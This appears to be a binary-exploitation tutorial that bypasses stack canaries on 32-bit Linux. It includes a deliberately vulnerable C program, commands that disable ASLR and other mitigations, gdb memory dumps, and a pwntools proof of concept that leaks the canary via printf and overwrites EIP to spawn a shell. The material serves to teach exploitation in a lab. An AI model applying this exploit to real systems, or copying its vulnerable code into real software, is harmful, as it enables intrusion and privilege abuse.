README
======

#### CHEATSHEET:
`$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space`

`$ gcc ssp_bypass.c -o ssp_bypass -fstack-protector-all -Wl,-z,norelro -no-pie -m32`

`gdb-peda$ set disable-randomization on`

`$ gcc -m32 -no-pie ssp_bypass.c -o ssp_bypass`

`$ x/wx $ebp - 0xc`

`0x00 is a null byte`

`$ info frame`

`$ pattern create`

`$ pattern offset`


#### VULNERABLE CODE:
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void pwn(void) 
{
   setuid(0);
   system("/bin/sh");
}

void begin() 
{
   setbuf(stdin, NULL);
   setbuf(stdout, NULL);
   setbuf(stderr, NULL);
}

void FaiCose() 
{
   char buf[100];

   for(int i=0;i<2;i++)
   {
      read(0, buf, 0x200);
      printf(buf);
   }
}

int main(void)
{
   begin();
   puts("Hello Hacker!");
   FaiCose();
   return 0;
}
```

# Stack Cookie
Stack Cookie, aka stack canary, stack protector, stack guard, SSP is an exploit mitigation technique which consists in a 4 bytes value pushed into the stack. When the function ends and the stack frame is cleared, the cookie value is checked against the previously pushed one. If it's changed (meaning a buffer overflow) the program will terminate calling __stack_chk_fail function. 

Below is shown the stack layout when the stack cookie protection is implemented.


Stack               | 
--------------------|
 Vulnerable Buffer  |
 Stack canary value |
 Return address     |


The stack cookie can be of the following types:

1. Random: 4-bytes value randomly generated
2. Random XOR: randomly generated then XOR'ed with stored control data.
3. Null: 0x00000000
4. Terminator: Combination of string terminators like 0x00, 0xff, 0x0a, and 0x0d
5. Custom implementations: usually the cookie value is hardcoded into the binary. Reverse and get it.


# Bypass Stack Cookie Techniques

1. Brute force
2. Information leakage
3. ret2write
4. format string

Before getting your hands dirty you should be aware of following:

* Value of the cookie and if it changes at every run.
* Type of cookie.
* Vulnerable functions and allowed characters.
* Know if it is possible to exploit the vuln before the function returns.
* If it's local or remote exploitation.
* If the cookie can be bruteforced.


 
## x32
### Information leak vulnerability
Information leak vulnerability can be used in order to know the cookie used by the program. Then we can append it to the payload and since the shellcode will have the correct cookie in the correct place on the stack, the execution will continue and the EIP will be controlled with an overwrite. Hopefully xD.

**Information leak of the stack cookie is feasible only if there is a function like print or printf which prints the buffer to stdout.**

This happens because the print/printf function will print out the buffer until a null byte will be found and we will see shortly that our stack cookie will have a null byte. If we manage to overwrite the null byte on the cookie, the printf function will continue to print the buffer to stdout until a new null byte will be found in memory. This means that stdout at some point will contain the cookie value that we can intercept and manipulate with the help of pwntools. **Without a print()/printf() function the leak will not happen.**

If we try to run our program passing "A"*300 we will get: 

`$ *** stack smashing detected ***: <unknown> terminated`

Since the program is interactive and awaits for our inputs after it prints out a welcome message, we have to use pwntool to make the exploit develompment less cumbersome.

Let's disassemble our function FaiCose():

```gdb-peda$ disass FaiCose
Dump of assembler code for function FaiCose:
   0x080492ef <+0>:	endbr32 
   0x080492f3 <+4>:	push   ebp
   0x080492f4 <+5>:	mov    ebp,esp
   0x080492f6 <+7>:	push   ebx
   0x080492f7 <+8>:	sub    esp,0x74
   0x080492fa <+11>:	call   0x8049190 <__x86.get_pc_thunk.bx>
   0x080492ff <+16>:	add    ebx,0x2d01
   0x08049305 <+22>:	mov    eax,gs:0x14
   0x0804930b <+28>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804930e <+31>:	xor    eax,eax
   0x08049310 <+33>:	mov    DWORD PTR [ebp-0x74],0x0
   0x08049317 <+40>:	jmp    0x8049342 <FaiCose+83>
   0x08049319 <+42>:	sub    esp,0x4
   0x0804931c <+45>:	push   0x200
   0x08049321 <+50>:	lea    eax,[ebp-0x70]
   0x08049324 <+53>:	push   eax
   0x08049325 <+54>:	push   0x0
   0x08049327 <+56>:	call   0x80490d0 <read@plt>
   0x0804932c <+61>:	add    esp,0x10
   0x0804932f <+64>:	sub    esp,0xc
   0x08049332 <+67>:	lea    eax,[ebp-0x70]
   0x08049335 <+70>:	push   eax
   0x08049336 <+71>:	call   0x80490e0 <printf@plt>
   0x0804933b <+76>:	add    esp,0x10
   0x0804933e <+79>:	add    DWORD PTR [ebp-0x74],0x1
   0x08049342 <+83>:	cmp    DWORD PTR [ebp-0x74],0x1
   0x08049346 <+87>:	jle    0x8049319 <FaiCose+42>
   0x08049348 <+89>:	nop
   0x08049349 <+90>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804934c <+93>:	xor    eax,DWORD PTR gs:0x14
   0x08049353 <+100>:	je     0x804935a <FaiCose+107>
   0x08049355 <+102>:	call   0x8049430 <__stack_chk_fail_local>
   0x0804935a <+107>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804935d <+110>:	leave  
   0x0804935e <+111>:	ret    
End of assembler dump.
```
Take a look here:

``` 
   0x08049348 <+89>:	nop
   0x08049349 <+90>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804934c <+93>:	xor    eax,DWORD PTR gs:0x14
   0x08049353 <+100>:	je     0x804935a <FaiCose+107>
```

Here is where our stack cookie is being checked, because a value is moved into eax, then eax is XORed with gs:0x104 which is a segment register that cannot be accessed within gdb and apparently contains our cookie value. The XOR operation will set the zero flag (ZF) value to 1 if the result of the XOR is 0 and vice versa. Every jump instruction (je in this case), will jump accordingly to the value of the zero flag. Je is "jump short if equal", which means that will jump if ZF=1, which means that eax and gs:0x14 must have the same value to continue the execution normally, otherwise the __stack_chk_fail_local function will be called.

Result of a XOR operation:

```
+---+---+---------+
| A | B | A XOR B |
+---+---+---------+
| 0 | 0 |    0    |
+---+---+---------+
| 0 | 1 |    1    |
+---+---+---------+
| 1 | 0 |    1    |
+---+---+---------+
| 1 | 1 |    0    |
+---+---+---------+

```

The program will check the stack cookie before returning the function and after having done all the previous operations like reading the buffer and printing on stdout.

Let's move on, set a breakpoint at 0x08049348, run the program and see what's inside ebp-0xc.

```
gdb-peda$ b *0x08049348

   0x08049346 <+87>:	jle    0x8049319 <FaiCose+42>
   *0x08049348 <+89>:	nop
   0x08049349 <+90>:	mov    eax,DWORD PTR [ebp-0xc]
```

```
gdb-peda$ x/wx $ebp-0xc
0xffffd0bc:	0x45b56200

```

Here we have our stack cookie with a null byte terminator. 
**Each time the program runs the value will be different except the null byte.**


If we take a look at the stack we can see the stack cookie is there:

```
gdb-peda$ info frame
Stack level 0, frame at 0xffffd0d0:
 eip = 0x8049348 in FaiCose; saved eip = 0x8049399
 called by frame at 0xffffd0f0
 Arglist at 0xffffd04c, args: 
 Locals at 0xffffd04c, Previous frame's sp is 0xffffd0d0
 Saved registers:
  ebx at 0xffffd0c4, ebp at 0xffffd0c8, eip at 0xffffd0cc
```


```
gdb-peda$ x/64wx $esp
0xffffd050:	0xf7fb4d20	0x00000002	0x4141410a	0x0000000a
0xffffd060:	0x00000001	0x00000000	0xf7e4bafd	0xf7fb55e0
0xffffd070:	0xf7fb4d20	0x0000000d	0xffffd0b8	0xf7e3ed4b
0xffffd080:	0xf7fb4d20	0x0000000a	0x0000000d	0xf7e45d49
0xffffd090:	0xf7fb4c80	0xf7fb4000	0xf7fb4dbc	0x0000000d
0xffffd0a0:	0xffffd0d8	0xf7fe8da4	0xfbad2087	0x0804c000
0xffffd0b0:	0xf7fb4000	0xf7fb4000	0xffffd0d8	0x45b56200 <= stack cookie
0xffffd0c0:	0x0804a010	0x0804c000	0xffffd0d8*	0x08049399
0xffffd0d0:	0xffffd0f0	0x00000000	0x00000000	0xf7decfb9
0xffffd0e0:	0xf7fb4000	0xf7fb4000	0x00000000	0xf7decfb9
0xffffd0f0:	0x00000002	0xffffd184	0xffffd190	0xffffd114
0xffffd100:	0x00000001	0x00000000	0xf7fb4000	0x00000000
0xffffd110:	0xf7ffd000	0x00000000	0xf7fb4000	0xf7fb4000
0xffffd120:	0x00000000	0xec4b6c98	0xae746288	0x00000000
0xffffd130:	0x00000000	0x00000000	0x00000002	0x08049140
0xffffd140:	0x00000000	0xf7fe8da4	0xf7fe39e0	0x0804c000

```

\* 0xffffd0d8 is EBP

At this point we have to find what is the offset that will overwrite the stack cookie, let's use pattern create.

```
gdb-peda$ pattern create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
```

If we look again at the stack cookie we can see how it has been overwritten:

```
gdb-peda$ x/wx $ebp-0xc
0xffffd0bc:	0x6841414c*
```

As noted previously the value has changed. Now we check the offset with pattern offset:

```
gdb-peda$ pattern offset 0x6841414c*
1749107020 found at offset: 99
```

After 99 bytes of the supplied buffer we have overwritten the stack cookie. Now that we have this information we can make it useful by leaking the stack cookie at runtime and put the correct value back in place at the moment we are exploiting the program.

**Things to note: The read() function reads from the stdin, and each time we press enter the newline (0x0a character) will be appended to the input string.**

```
gdb-peda$ r
Starting program: /mnt/tools/binary/binary_exploitation/linux/stack_cookie_bypass/ssp_bypass AAAA
Hello Hacker!
AAAA
AAAA
AAAA
AAAA
[..CUT..]
Breakpoint 1, 0x08049348 in FaiCose ()
gdb-peda$ x/wx $ebp-0xc
0xffffd0bc:	0xcd52d100 (new stack cookie)*

gdb-peda$ x/64wx $esp
0xffffd050:	0xf7fb4d20	0x00000002	0x41414141	0x0000000a <= newline here 0x0a
0xffffd060:	0x00000001	0x00000000	0xf7e4bafd	0xf7fb55e0
0xffffd070:	0xf7fb4d20	0x0000000d	0xffffd0b8	0xf7e3ed4b
0xffffd080:	0xf7fb4d20	0x0000000a	0x0000000d	0xf7e45d49
0xffffd090:	0xf7fb4c80	0xf7fb4000	0xf7fb4dbc	0x0000000d
0xffffd0a0:	0xffffd0d8	0xf7fe8da4	0xfbad2087	0x0804c000
0xffffd0b0:	0xf7fb4000	0xf7fb4000	0xffffd0d8	0xcd52d100*
0xffffd0c0:	0x0804a010	0x0804c000	0xffffd0d8	0x08049399
0xffffd0d0:	0xffffd0f0	0x00000000	0x00000000	0xf7decfb9
0xffffd0e0:	0xf7fb4000	0xf7fb4000	0x00000000	0xf7decfb9
0xffffd0f0:	0x00000002	0xffffd184	0xffffd190	0xffffd114
0xffffd100:	0x00000001	0x00000000	0xf7fb4000	0x00000000
0xffffd110:	0xf7ffd000	0x00000000	0xf7fb4000	0xf7fb4000
0xffffd120:	0x00000000	0x51d28e97	0x13ed8087	0x00000000
0xffffd130:	0x00000000	0x00000000	0x00000002	0x08049140
0xffffd140:	0x00000000	0xf7fe8da4	0xf7fe39e0	0x0804c000
```


If we supply "A"\*100 the stack cookie would be 0xcd52d10a because the null byte would be overwritten by the new line char. For example if we supply "A"*101 it would be 0xcd520a41 and so on. This is important because this allows the leak of the cookie value. **If we do not overwrite the null byte in our cookie value, the printf() function will stop sending output to stdout as soon as it meets the null byte and the leak of the cookie will not happen.** We will see this in a while.

To prove that the address we are targeting is the correct stack cookie let's try an input of "A"\*100:

```
Breakpoint 1, 0x08049348 in FaiCose ()
gdb-peda$ x/wx $ebp-0xc
0xffffd0bc:	0x094c1b0a <= notice the newline char
```

Now we continue the execution and will get the error:

```
gdb-peda$ c
Continuing.
*** stack smashing detected ***: <unknown> terminated

Program received signal SIGABRT, Aborted.
```

Let's run the same "A"\*100 but this time we will put the null byte back in place before continuing the execution:

```
[..CUT..]
Breakpoint 1, 0x08049348 in FaiCose ()
gdb-peda$ x/wx $ebp-0xc
0xffffd0bc:	0x18990d0a <= cookie value

gdb-peda$ set {int}0xffffd0bc = 0x18990d00
gdb-peda$ c
Continuing.
[Inferior 1 (process 29427) exited normally]
Warning: not running
```
Boom! We got it! The program continued the execution so this confirms that we are looking at the right register which holds the stack cookie.

We noticed that the program will accept the input from the user for two times, so the first time we can leak the stack cookie without triggering the buffer overflow. The second time, with the correct value, we can send our payload and overwrite EIP with the address of the shell function pwn() present inside the program.


### Exploitation
Let's write down the pwn function address 0x08049256: 

```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[..CUT..]
0x08049250  frame_dummy
0x08049256  pwn <= HERE
0x08049291  begin
0x080492ef  FaiCose
0x0804935f  main
```

Below there is the first part of our PoC:

```
#!/usr/bin/python3

from pwn import *
import struct
import sys


# PART 1 - Cookie Leakage
try:
    n_of_A = int(sys.argv[1])
    pwn_fun = "\x56\x92\x04\x08"               # shell function
    exploit = process("./ssp_bypass")          # run the program
    exploit.recvuntil("Hello Hacker!")         # receive until the program greets us
 
    payload = "A" * n_of_A                     # Payload creation
    exploit.sendline(payload)                  # send A's to the program
    reply = exploit.recvuntil("A"*n_of_A)      # receive until the program finished to print back our input
    log.info(reply)

    try:
        cookie = u32(exploit.recv(4))           # receive 4 more bytes after the A to get the cookie val
        log_info  = "Cookie with newline: "     
        log_info += hex(cookie)
        log.info(log_info)                      # log the cookie with the newline char

        cookie_original = cookie - 0x0a         # put back in place the null byte instead of the newline char (0x0a)

        log_info  = "Cookie original val: "
        log_info += hex(cookie_original)
        log.info(log_info)                      # log the original cookie

    except struct.error as e:
        print("[-] " + str(e))

except IndexError:
    print("Usage: ssp_poc.py <number_of_A>")
```

If i run the exploit with "A"*99 i get the following:

```
$ python3 ssp_poc.py 99
[+] Starting local process './ssp_bypass': pid 11726
[*] b'\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[-] unpack requires a buffer of 4 bytes
```
Without overwriting the null byte of the cookie it will not be leaked by printf and we are not able to see it. Let's try to input "A"*100:

```
$ python3 ssp_poc.py 100
[+] Starting local process './ssp_bypass': pid 11730
[*] b'\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[*] Cookie with newline: 0x212d730a
[*] Cookie original val: 0x212d7300
```
Overwriting the null byte, printf will continue its job until another null byte. In this case our script will stop receiving the buffer after 4 bytes.

`cookie = u32(exploit.recv(4))`

With the cookie value we can proceed to the second part of the exploitation: put the cookie back in place and trigger pwn.

Let's run the program again inside gdb and grab the position of the EIP register.

```
Breakpoint 1, 0x08049348 (nop) in FaiCose ()
gdb-peda$ info frame
Stack level 0, frame at 0xffffd120:
 eip = 0x8049348 in FaiCose; saved eip = 0x8049399*
 called by frame at 0xffffd140
 Arglist at 0xffffd09c, args: 
 Locals at 0xffffd09c, Previous frame's sp is 0xffffd120
 Saved registers:
  ebx at 0xffffd114, ebp at 0xffffd118**, eip at 0xffffd11c
```


```
gdb-peda$ x/32wx $esp
0xffffd0a0:	0xf7faed80	0x00000002	0x41414141	0x41414141
0xffffd0b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd100:	0x41414141	0x41414141	0x41414141	0x6a153a0a
0xffffd110:	0x0804a010	0x0804c000	0xffffd128	0x08049399 <= EIP*
                                    ^EBP**
```

8 bytes after the cookie we will have EBP, 12 bytes after we will have EIP. According to this, below the second part of our PoC.

```
    # SECOND PART - Buffer Overflow
    pwn_function = p32(0x08049256)              # shell function

    payload  = b"A" * 100                       # bytes because p32() will be bytes
    payload += p32(cookie_original)
    payload += b"B" * 12
    payload += pwn_function
    log.info("Sending payload: " + str(payload))

    exploit.send(payload)
    exploit.recv()
    exploit.interactive()
```

```
$ python3 ssp_poc.py 100
[+] Starting local process './ssp_bypass': pid 14450
[*] b'\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[*] Cookie with newline: 0x55713d0a
[*] Cookie original val: 0x55713d00
[*] Sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00=qUBBBBBBBBBBBBV\x92\x04\x08'
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ 
$ whoami
andrea
```









